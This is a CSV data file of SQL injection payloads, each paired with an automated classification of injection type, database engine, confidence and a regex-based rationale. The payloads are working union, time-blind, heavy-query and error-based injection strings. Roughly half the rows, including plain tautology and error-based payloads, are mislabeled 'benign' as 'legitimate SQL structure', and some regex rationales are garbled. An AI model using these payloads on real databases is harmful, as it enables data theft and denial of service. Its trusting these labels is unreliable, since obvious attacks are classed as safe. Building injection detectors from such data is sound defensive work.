id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
24744,"1"" ) where 8588 = 8588",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24745,"1' and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24746,1 ) where 6304 = 6304,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24747,"-6924' ) union all select 2046,2046,2046,2046,2046,2046,2046--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24748,"-2901"" or elt ( 9866 = 9099,9099 ) and ""asib"" like ""asib",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24749,-6500' ) ) or ( 8459 = 8459 ) *4906 and ( ( 'padu' like 'padu,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24750,"1' ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'wcmt' = 'wcmt",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24751,"1 ) as qzif where 7877 = 7877 union all select null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24752,"1%' ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
24753,1' ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ),time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
24754,select ( case when ( 2830 = 7046 ) then 2830 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24755,"1'+ ( select 'ixza' where 4374 = 4374 union all select null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24756,"1' ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( 'dzzx' = 'dzzx",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
24757,"1 ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24758,-3677' ) ) or 1939 = 4484,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24759,"1' ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'nbsr' like 'nbsr",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
24760,"-7323%"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24761,"1%' ) ) ) union all select null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24762,"1' and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'cxor' = 'cxor",error_based,oracle,0.85,Signal match: ctxsys.drithsx → error_based (P4); DB signature: oracle,1
24763,"-3298 union all select 7618,7618,7618,7618,7618,7618,7618,7618,7618,7618#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24764,"1 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) # zwck",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24765,"1%' ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( '%' = '",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24766,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ( '%' = '",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24767,-9393' where 3119 = 3119 or 8571 = 8571--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24768,"1'+ ( select 'ixvd' where 4772 = 4772 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) +'",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24769,"-8506' ) ) ) union all select 1950,1950,1950,1950,1950,1950--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24770,1 and sleep ( 5 ) #,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24771,1'+ ( select yjtm where 3965 = 3965 and 9389 = 3443,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24772,"-3505"" ) or 5290 = 3436--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24773,"1' ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( 'knhm' = 'knhm",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
24774,"1' where 4245 = 4245 union all select null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24775,1 ) ) as rbcf where 1053 = 1053,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24776,"1"" ) ) as gbxx where 2459 = 2459 waitfor delay '0:0:5'--",time_blind,mssql,0.85,Signal match: waitfor delay → time_blind (P5); DB signature: mssql,1
24777,"select pg_sleep ( 5 ) and ( ( ""qani"" = ""qani",time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
24778,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ""soyg"" = ""soyg",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24779,-5113' ) ) ) or 7200 = 3094--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24780,"1"" ) as zuzm where 1211 = 1211 and elt ( 5458 = 2966,2966 ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24781,1'|| ( select 'pcps' from dual where 7255 = 7255 and 7121 = 4603,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
